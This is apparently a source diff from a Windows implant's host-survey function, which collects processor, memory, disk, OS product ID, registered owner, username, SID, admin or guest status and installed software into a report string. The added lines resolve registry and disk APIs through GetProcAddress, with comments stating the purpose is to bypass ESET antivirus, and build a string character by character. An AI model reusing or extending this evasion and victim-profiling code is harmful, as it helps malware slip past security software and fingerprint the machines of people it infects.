@@ -12,7 +12,6 @@ VOID GetDeviceInfo()
 	HKEY hKey;
 	ULONG uLen;
 	PDEVICE_INFO pDeviceInfo;
-	
 	if (pDeviceContainer != NULL)
 	{
 #ifdef _DEBUG
@@ -24,13 +23,19 @@ VOID GetDeviceInfo()
 #ifdef _DEBUG
 	OutputDebugString(L"[+] Starting GetDeviceInfo\n");
 #endif
-
+	
 	pDeviceContainer = (PDEVICE_CONTAINER)malloc(sizeof(DEVICE_CONTAINER));
 	pDeviceInfo = (PDEVICE_INFO)malloc(sizeof(DEVICE_INFO));
 	memset(pDeviceInfo, 0x0, sizeof(DEVICE_INFO));
 	
+	// getprocaddr per bypass ESET
+	typedef LONG (WINAPI *REGOPENKEYEXW)(__in HKEY hKey, __in LPWSTR lpSubKey, __in DWORD ulOptions, __in REGSAM samDesired, __out PHKEY phkResult);
+	REGOPENKEYEXW fpRegOpenKeyEx = (REGOPENKEYEXW) GetProcAddress(LoadLibrary(L"advapi32"), "RegOpenKeyExW");
+	typedef LONG (WINAPI *REGQUERYVALUEEX) (HKEY, LPWSTR, LPDWORD ,LPDWORD, LPBYTE, LPDWORD);
+	REGQUERYVALUEEX pfn_RegQueryValueEx = (REGQUERYVALUEEX) GetProcAddress(LoadLibrary(L"advapi32"), "RegQueryValueExW");
+
 	// Processor
-	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
+	if (fpRegOpenKeyEx(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
 	{
 		uLen = sizeof(pDeviceInfo->procinfo.proc);
 		if (RegQueryValueEx(hKey, L"ProcessorNameString", NULL, NULL, (PBYTE)pDeviceInfo->procinfo.proc, &uLen) != ERROR_SUCCESS)
@@ -66,29 +71,33 @@ VOID GetDeviceInfo()
 	pDeviceInfo->meminfo.memload = (ULONG)(pMemoryStatus.dwMemoryLoad);
 	
 	// os
-	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
+	//if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
+	if (fpRegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
 	{
 		uLen = sizeof(pDeviceInfo->osinfo.ver);
-		if (RegQueryValueEx(hKey, L"ProductName", NULL, NULL, (PBYTE)pDeviceInfo->osinfo.ver, &uLen) != ERROR_SUCCESS)
+		if (pfn_RegQueryValueEx(hKey, L"ProductName", NULL, NULL, (PBYTE)pDeviceInfo->osinfo.ver, &uLen) != ERROR_SUCCESS)
 			pDeviceInfo->osinfo.ver[0] = L'\0';
-
+		
 		uLen = sizeof(pDeviceInfo->osinfo.sp);
-		if (RegQueryValueEx(hKey, L"CSDVersion", NULL, NULL, (PBYTE)pDeviceInfo->osinfo.sp, &uLen) != ERROR_SUCCESS)
+		if (pfn_RegQueryValueEx(hKey, L"CSDVersion", NULL, NULL, (PBYTE)pDeviceInfo->osinfo.sp, &uLen) != ERROR_SUCCESS)
 			pDeviceInfo->osinfo.sp[0] = L'\0';
-
+		
+		
+		WCHAR strProductId[] = { L'P', L'r', L'o', L'd', L'u', L'c', L't', L'I', L'd', L'\0' };
 		uLen = sizeof(pDeviceInfo->osinfo.id);
-		if (RegQueryValueEx(hKey, L"ProductId", NULL, NULL, (PBYTE)pDeviceInfo->osinfo.id, &uLen) != ERROR_SUCCESS)
+		if (pfn_RegQueryValueEx(hKey, L"ProductId", NULL, NULL, (PBYTE)pDeviceInfo->osinfo.id, &uLen) != ERROR_SUCCESS)
 			pDeviceInfo->osinfo.id[0] = L'\0';
-
+		
 		uLen = sizeof(pDeviceInfo->osinfo.owner);
-		if (RegQueryValueEx(hKey, L"RegisteredOwner", NULL, NULL, (PBYTE)pDeviceInfo->osinfo.owner, &uLen) != ERROR_SUCCESS)
+		if (pfn_RegQueryValueEx(hKey, L"RegisteredOwner", NULL, NULL, (PBYTE)pDeviceInfo->osinfo.owner, &uLen) != ERROR_SUCCESS)
 			pDeviceInfo->osinfo.owner[0] = L'\0';
 
 		uLen = sizeof(pDeviceInfo->osinfo.org);
-		if (RegQueryValueEx(hKey, L"RegisteredOrganization", NULL, NULL, (PBYTE)pDeviceInfo->osinfo.org, &uLen) != ERROR_SUCCESS)
+		if (pfn_RegQueryValueEx(hKey, L"RegisteredOrganization", NULL, NULL, (PBYTE)pDeviceInfo->osinfo.org, &uLen) != ERROR_SUCCESS)
 			pDeviceInfo->osinfo.org[0] = L'\0';
-
+		
 		RegCloseKey(hKey);
+		
 	}
 	else
 	{
@@ -98,7 +107,7 @@ VOID GetDeviceInfo()
 		pDeviceInfo->osinfo.owner[0] = L'\0';
 		pDeviceInfo->osinfo.org[0] = L'\0';
 	}
-		
+	
 	
 	// user
 	uLen = sizeof(pDeviceInfo->userinfo.username) / sizeof(WCHAR);
@@ -111,7 +120,7 @@ VOID GetDeviceInfo()
 	if (NetUserGetInfo(NULL, pDeviceInfo->userinfo.username, 1, &pUserInfo) == NERR_Success)
 		pDeviceInfo->userinfo.priv = ((PUSER_INFO_1)pUserInfo)->usri1_priv;		
 
-	// FIN QUI TUTTO OK
+	
 
 	
 	SecureZeroMemory(pDeviceInfo->userinfo.fullname, 0x2);
@@ -119,7 +128,6 @@ VOID GetDeviceInfo()
 
 
 	typedef NET_API_STATUS (WINAPI *NETUSERGETINFO)(LPWSTR, LPWSTR, DWORD, LPBYTE*);
-	//NET_API_STATUS NetUserGetInfo(__in LPCWSTR servername, __in LPCWSTR username, __in DWORD level, __out LPBYTE *bufptr);
 	NETUSERGETINFO pfn_NetUserGetInfo = (NETUSERGETINFO) GetProcAddress(LoadLibrary(L"netapi32"), "NetUserGetInfo");
 
 	if (pfn_NetUserGetInfo(NULL, pDeviceInfo->userinfo.username, 23, &pUserInfo) == NERR_Success)
@@ -129,19 +137,10 @@ VOID GetDeviceInfo()
 		if (ConvertSidToStringSid(((PUSER_INFO_23)pUserInfo)->usri23_user_sid, &pSidStr))
 			wcsncpy_s(pDeviceInfo->userinfo.sid, sizeof(pDeviceInfo->userinfo.sid) / sizeof(WCHAR), pSidStr, _TRUNCATE);
 	}
-	/*
-	if (NetUserGetInfo(NULL, pDeviceInfo->userinfo.username, 23, &pUserInfo) == NERR_Success)
-	{
-		PWCHAR pSidStr = NULL;
-		wcsncpy_s(pDeviceInfo->userinfo.fullname, sizeof(pDeviceInfo->userinfo.fullname) / sizeof(WCHAR), ((PUSER_INFO_23)pUserInfo)->usri23_full_name, _TRUNCATE);
-		if (ConvertSidToStringSid(((PUSER_INFO_23)pUserInfo)->usri23_user_sid, &pSidStr))
-			wcsncpy_s(pDeviceInfo->userinfo.sid, sizeof(pDeviceInfo->userinfo.sid) / sizeof(WCHAR), pSidStr, _TRUNCATE);
-	}
-	*/
 	
 	NetApiBufferFree(pUserInfo);
 	
-
+	
 	// locale & timezone
 	if (!GetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SISO639LANGNAME, pDeviceInfo->localinfo.lang, sizeof(pDeviceInfo->localinfo.lang) / sizeof(WCHAR)))
 		pDeviceInfo->localinfo.lang[0] = L'\0';
@@ -149,19 +148,13 @@ VOID GetDeviceInfo()
 		pDeviceInfo->localinfo.country[0] = L'\0';
 
 	pDeviceInfo->localinfo.timebias = 0;
-
+	
 	if (!RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation", 0, KEY_READ, &hKey) != ERROR_SUCCESS)
 	{
 		uLen = sizeof(ULONG);
 
-		typedef LONG (WINAPI *REGQUERYVALUEEX) (HKEY, LPWSTR, LPDWORD ,LPDWORD, LPBYTE, LPDWORD);
-		REGQUERYVALUEEX pfn_RegQueryValueEx = (REGQUERYVALUEEX) GetProcAddress(LoadLibrary(L"advapi32"), "RegQueryValueExW");
-
 		if (pfn_RegQueryValueEx(hKey, L"ActiveTimeBias", NULL, NULL, (PBYTE)&pDeviceInfo->localinfo.timebias, &uLen) != ERROR_SUCCESS)
 			pDeviceInfo->localinfo.timebias = 0;
-
-		//if (RegQueryValueEx(hKey, L"ActiveTimeBias", NULL, NULL, (PBYTE)&pDeviceInfo->localinfo.timebias, &uLen) != ERROR_SUCCESS)
-		//	pDeviceInfo->localinfo.timebias = 0;
 
 		RegCloseKey(hKey);
 	}
@@ -177,18 +170,17 @@ VOID GetDeviceInfo()
 	
 
 	
-	// disk
-	
+	// disk	
 	ULARGE_INTEGER uDiskFree, uDiskTotal;
 	PWCHAR wPath = (PWCHAR)malloc(32767 * sizeof(WCHAR));
 	
 	if (!GetEnvironmentVariable(L"TMP", wPath, 32767 * sizeof(WCHAR)))
 		wcsncpy_s(wPath, 32767 * sizeof(WCHAR), L"C:\\", _TRUNCATE);
-
-	/* GetProcAddress vari per bypass ESET */
+	
+	// GetProcAddress vari per bypass ESET 
 	typedef BOOL (WINAPI *GETDISKFREESPACEEX) (LPWSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER);	
 	GETDISKFREESPACEEX pfn_GetDiskFreeSpaceEx = (GETDISKFREESPACEEX) GetProcAddress(LoadLibrary(L"kernel32"), "GetDiskFreeSpaceExW");
-
+	
 	if (pfn_GetDiskFreeSpaceEx(wPath, &uDiskFree, &uDiskTotal, NULL))
 	{
 		pDeviceInfo->diskinfo.disktotal = (ULONG) (uDiskTotal.QuadPart / (1024*1024));
@@ -196,6 +188,7 @@ VOID GetDeviceInfo()
 	}
 	else
 		pDeviceInfo->diskinfo.disktotal = pDeviceInfo->diskinfo.diskfree = 0;
+	
 	
 	BOOL bIsWow64, bIsx64OS;
 	IsWow64Process(GetCurrentProcess(), &bIsWow64);
@@ -211,7 +204,7 @@ VOID GetDeviceInfo()
 		+ wcslen(pApplicationList) * sizeof(WCHAR) 
 		+ (pApplicationList64 ? wcslen(pApplicationList64) * sizeof(WCHAR) : 0)
 		+ 1024);
-		
+	
 	_snwprintf_s(pDeviceString,
 		sizeof(DEVICE_INFO)/sizeof(WCHAR) + wcslen(pApplicationList) + (pApplicationList64 ? wcslen(pApplicationList64) : 0) + 1024/sizeof(WCHAR),
 		_TRUNCATE,
@@ -229,16 +222,14 @@ VOID GetDeviceInfo()
 		pDeviceInfo->procinfo.procnum, pDeviceInfo->procinfo.proc,
 		pDeviceInfo->meminfo.memfree, pDeviceInfo->meminfo.memtotal, pDeviceInfo->meminfo.memload,
 		pDeviceInfo->diskinfo.diskfree, pDeviceInfo->diskinfo.disktotal,
-		//pDeviceInfo->osinfo.ver, (pDeviceInfo->osinfo.sp[0]) ? L" (" : L"", (pDeviceInfo->osinfo.sp[0]) ? pDeviceInfo->osinfo.sp : L"", (pDeviceInfo->osinfo.sp[0]) ? L")" : L"", IsX64System() ? L" (64bit)" : L" (32bit)",
-		pDeviceInfo->osinfo.ver, (pDeviceInfo->osinfo.sp[0]) ? L" (" : L"", (pDeviceInfo->osinfo.sp[0]) ? pDeviceInfo->osinfo.sp : L"", (pDeviceInfo->osinfo.sp[0]) ? L")" : L"", bIsx64OS ? L" (64bit)" : L" (32bit)",
+		pDeviceInfo->osinfo.ver, (pDeviceInfo->osinfo.sp[0]) ? L" (" : L"", (pDeviceInfo->osinfo.sp[0]) ? pDeviceInfo->osinfo.sp : L"", (pDeviceInfo->osinfo.sp[0]) ? L")" : L"", bIsx64OS ? L" (64-bit)" : L" (32-bit)",
 		pDeviceInfo->osinfo.owner, (pDeviceInfo->osinfo.org[0]) ? L" (" : L"", (pDeviceInfo->osinfo.org[0]) ? pDeviceInfo->osinfo.org : L"", (pDeviceInfo->osinfo.org[0]) ? L")" : L"", pDeviceInfo->osinfo.id,
 		pDeviceInfo->localinfo.lang, pDeviceInfo->localinfo.country, (-1 * (int)pDeviceInfo->localinfo.timebias) / 60, abs((int)pDeviceInfo->localinfo.timebias) % 60,
-		pDeviceInfo->userinfo.username, (pDeviceInfo->userinfo.fullname[0]) ? L" (" : L"", (pDeviceInfo->userinfo.fullname[0]) ? pDeviceInfo->userinfo.fullname : L"", (pDeviceInfo->userinfo.fullname[0]) ? L")" : L"", (pDeviceInfo->userinfo.priv) ? ((pDeviceInfo->userinfo.priv == 1) ? L"" : L" {ADMIN}") : L" {GUEST}",
+		pDeviceInfo->userinfo.username, (pDeviceInfo->userinfo.fullname[0]) ? L" (" : L"", (pDeviceInfo->userinfo.fullname[0]) ? pDeviceInfo->userinfo.fullname : L"", (pDeviceInfo->userinfo.fullname[0]) ? L")" : L"", (pDeviceInfo->userinfo.priv) ? ((pDeviceInfo->userinfo.priv == 1) ? L"" : L" [ADMIN]") : L" [GUEST]",
 		pDeviceInfo->userinfo.sid,
 		pApplicationList,
 		pApplicationList64 ? pApplicationList64 : L"");
-
-		
+	
 	pDeviceContainer->pDataBuffer = (PBYTE)pDeviceString;
 	pDeviceContainer->uSize = (wcslen(pDeviceString)+1)*sizeof(WCHAR);
 	
@@ -246,7 +237,7 @@ VOID GetDeviceInfo()
 	free(pApplicationList64);
 	free(pDeviceInfo);
 	free(wPath);
-
+	
 	return;
 }
 
@@ -256,7 +247,7 @@ PWCHAR GetApplicationList(BOOL bX64View)
 	HKEY hKeyUninstall, hKeyProgram;
 	WCHAR pStringValue[128], pProduct[256];
 	PWCHAR pApplicationList = NULL;
-
+	
 	uLen = uIndex = 0;
 	hKeyUninstall = hKeyProgram = NULL;
 
